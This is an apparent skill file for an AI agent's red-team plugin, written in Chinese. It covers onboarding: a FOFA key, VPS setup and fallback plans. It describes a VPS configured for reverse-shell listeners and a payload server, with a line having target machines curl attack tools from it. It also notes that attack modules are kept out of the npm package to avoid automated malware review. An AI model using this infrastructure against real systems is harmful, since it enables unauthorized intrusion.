---
name: redteam-setup
description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
role: plan
enabled: true
---

# 首次使用引导（把环境一次配齐）

**触发条件**（满足任一即执行本技能，不要跳过）：
- `redteam_preflight` 返回里 `onboarding.complete=false`；
- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
- 用户第一次进红队模式、或明确说"环境/工具没配好"。

**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。

## 一、先确认你有没有"工具箱"（npm 版默认没有）

npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /
WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把
"包在安装后自动下载渗透二进制"判定为恶意行为特征，整包会被 Blocked。

- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；
- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目
  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README
  **由用户自己执行**，再到第三节手动配 `FOFA_KEY` 与 VPS；
- **都不要**也行：只用本包自带的 14 个侦察/检测向技能（`fofa-recon` / `active-scan` /
  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等）也能开工，只是拿不到需要落地的成果。

> **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。

## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）

| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
| --- | --- | --- | --- |
| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |

**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。

**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。

### FOFA_KEY 怎么拿（要能指导用户）
1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。

### VPS 怎么准备（要能指导用户）
- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。

## 三、配置完的验证（必须做完才算引导成功）

逐项实测，**不要只看"文件存在"**：

```bash
# 1) FOFA key 有效
curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'

# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'

# 3) 技能注册表可见
#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
```

> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
> （npm 版不含该脚本，见第一节）。
## 四、最后一步：写完成标记并复核

配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：

```bash
mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
```

然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。

**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
这一步要明确告诉用户（智能体不能替他重启）。

## 五、用户就是不给某些资源时（降级口径）

| 缺什么 | 降级方案 | 必须向用户说明的限制 |
| --- | --- | --- |
| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |

**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。
